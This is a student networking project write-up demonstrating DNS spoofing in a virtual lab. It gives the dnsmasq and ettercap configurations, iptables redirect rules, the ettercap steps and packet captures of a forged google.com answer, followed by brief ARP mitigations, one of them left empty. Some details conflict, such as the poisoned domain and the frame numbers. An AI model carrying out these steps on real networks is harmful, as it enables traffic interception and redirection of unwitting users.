#+title: Networks Project
#+Author: Adithya Nair
#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="https://gongzhitaao.org/orgcss/org.css"/>

* Background
This is a demonstration of a DNS Spoofing attack using virtual machines.

The process in brief, we start up a Kali VM running dnsmasq.

dnsmasq is a service that allows you to run a lightweight dns server for local networks. The attack works as follows.

A user attempts to access a domain, for this example we have poisoned the DNS records of the domain grouptwo.com. The Kali VM performs an ARP spoof, which sends ARP packets to all the devices in the local network to make the Kali VM act as the default gateway. All requests are routed through the VM now.

The VM is setup such that it performs IP forwarding, all packets are sent to their intended destination.

We update the IP tables to redirect and manage DNS traffic, both TCP and UDP packets. We also add in a command that updates the source address of the IP address of the DNS response to make it seem like it came from a legitimate DNS server (for example 8.8.8.8).

We apply the attack using the ettercap software as will be detailed below.

* Implementation
We have two VMs, one running Kali Linux and the other running a VM called Metasploitable. These VMs exist in a virtual network with the network address 10.0.2.0
* Setup
** IP Address Info
 * Kali VM - 10.0.2.15
 * Metasploitable - 10.0.2.4
** On Kali
*** Writing The DNSMasq Configuration
#+begin_src conf
interface=eth0
address=/grouptwo.com/10.0.2.15
#+end_src
*** Writing The etter.dns configuration
#+begin_src conf
grouptwo.com A 10.0.2.15
#+end_src
*** Enabling IP Forwarding
#+begin_src shell
echo 1 > /proc/sys/net/ipv4/ip_forward
#+end_src
*** Configuring The IP Tables
#+begin_src shell
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 10.0.2.15:53
sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 10.0.2.15:53
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
#+end_src
* How To Execute The Attack
** On Kali
Start DNS Server
#+begin_src shell
sudo systemctl start dnsmasq.service
#+end_src

Start sniffing

#+begin_src shell
sudo ettercap -G
#+end_src

Click Accept

Apply scan for hosts.

Activate the DNS Spoofing plugin.
* Packets Captured
** Query
*** Summary
#+begin_example
97	39.532672	10.0.2.4	8.8.8.8	DNS	70	Standard query 0x8dd1 A google.com
#+end_example
*** YAML
#+begin_example
# Packet 0 from /home/kali/Desktop/dns_spoofing.pcap
- 97
- 39.532672
- 10.0.2.4
- 8.8.8.8
- DNS
- 70
- Standard query 0x8dd1 A google.com
#+end_example
*** Packet
#+begin_example
Frame 97: 70 bytes on wire (560 bits), 70 bytes captured (560 bits)
Ethernet II, Src: PCSSystemtec_c1:17:c2 (08:00:27:c1:17:c2), Dst: PCSSystemtec_ad:25:87 (08:00:27:ad:25:87)
Internet Protocol Version 4, Src: 10.0.2.4, Dst: 8.8.8.8
User Datagram Protocol, Src Port: 53085, Dst Port: 53
    Source Port: 53085
    Destination Port: 53
    Length: 36
    Checksum: 0x7275 [unverified]
    [Checksum Status: Unverified]
    [Stream index: 0]
    [Timestamps]
    UDP payload (28 bytes)
Domain Name System (query)
    Transaction ID: 0x8dd1
    Flags: 0x0100 Standard query
    Questions: 1
    Answer RRs: 0
    Authority RRs: 0
    Additional RRs: 0
    Queries
    [Response In: 98]
#+end_example

** Response
*** Summary
#+begin_example
99	39.533556	8.8.8.8	10.0.2.4	DNS	86	Standard query response 0x8dd1 A google.com A 10.0.2.15
#+end_example
*** YAML
#+begin_example
# Packet 1 from /home/kali/Desktop/dns_spoofing.pcap
- 98
- 39.532899
- 8.8.8.8
- 10.0.2.4
- DNS
- 86
- Standard query response 0x8dd1 A google.com A 10.0.2.15
#+end_example
*** Packet
#+begin_example
Frame 98: 86 bytes on wire (688 bits), 86 bytes captured (688 bits)
Ethernet II, Src: PCSSystemtec_ad:25:87 (08:00:27:ad:25:87), Dst: PCSSystemtec_c1:17:c2 (08:00:27:c1:17:c2)
Internet Protocol Version 4, Src: 8.8.8.8, Dst: 10.0.2.4
User Datagram Protocol, Src Port: 53, Dst Port: 53085
    Source Port: 53
    Destination Port: 53085
    Length: 52
    Checksum: 0x1c59 [unverified]
    [Checksum Status: Unverified]
    [Stream index: 0]
    [Timestamps]
    UDP payload (44 bytes)
Domain Name System (response)
    Transaction ID: 0x8dd1
    Flags: 0x8580 Standard query response, No error
    Questions: 1
    Answer RRs: 1
    Authority RRs: 0
    Additional RRs: 0
    Queries
    Answers
    [Request In: 97]
    [Time: 0.000227000 seconds]
#+end_example
* Ways To Mitigate Against The Attack
** Static ARP Entries
Assign a static IP Address to the router.
#+begin_src shell
arp -s <gateway-ip> <gateway-mac-address>
#+end_shell
** Dynamic ARP Inspection
#+begin_src shell
#+end_src
